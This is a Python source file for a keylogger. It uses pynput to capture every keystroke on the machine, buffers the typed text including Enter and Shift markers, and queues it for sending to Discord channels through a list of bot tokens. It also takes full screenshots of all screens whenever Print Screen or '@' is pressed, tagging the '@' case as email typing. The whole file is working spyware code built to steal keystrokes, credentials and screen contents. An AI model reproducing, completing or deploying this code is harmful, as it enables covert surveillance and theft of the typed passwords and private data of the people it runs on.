from pynput.keyboard import Key, Listener
from resources.misc import *
from PIL import ImageGrab
# end of imports

# anywhere
def on_press(key):
    global files_to_send, messages_to_send, embeds_to_send, channel_ids, text_buffor
    processed_key = str(key)[1:-1] if (str(key)[0]=='\'' and str(key)[-1]=='\'') else key
    if processed_key in ctrl_codes.keys():
        processed_key = ' `' + ctrl_codes[processed_key] + '`'
    if processed_key not in [Key.ctrl_l, Key.alt_gr, Key.left, Key.right, Key.up, Key.down, Key.delete, Key.alt_l, Key.shift_r]:
        if processed_key== Key.space:
            processed_key = ' '
        elif processed_key== Key.shift:
            processed_key = ' *`SHIFT`*'
        elif processed_key== Key.tab:
            processed_key = ' *`TAB`*'
        elif processed_key== Key.backspace:
            processed_key = ' *`<`*'
        elif processed_key== Key.enter:
            processed_key = ''; messages_to_send.append([channel_ids['main'], text_buffor + ' *`ENTER`*']); text_buffor = ''
        elif processed_key== Key.print_screen or processed_key== '@':
                processed_key = ' *`Print Screen`*' if processed_key == Key.print_screen else '@'
                ImageGrab.grab(all_screens=True).save('ss.png')
                embeds_to_send.append([channel_ids['main'], current_time() + (' `[Print Screen pressed]`' if processed_key == ' *`Print Screen`*' else ' `[Email typing]`'), 'ss.png'])
        text_buffor += str(processed_key)
        if len(text_buffor) > 1975:
            if 'wwwww' in text_buffor or 'aaaaa' in text_buffor or 'sssss' in text_buffor or 'ddddd' in text_buffor:
                messages_to_send.append([channel_ids['spam'], text_buffor])
            else:
                messages_to_send.append([channel_ids['main'], text_buffor])
            text_buffor = ''

# bottom
with Listener(on_press=on_press) as listener:
    for token in bot_tokens:
        try:
            client.run(token)
        except: pass
    listener.join()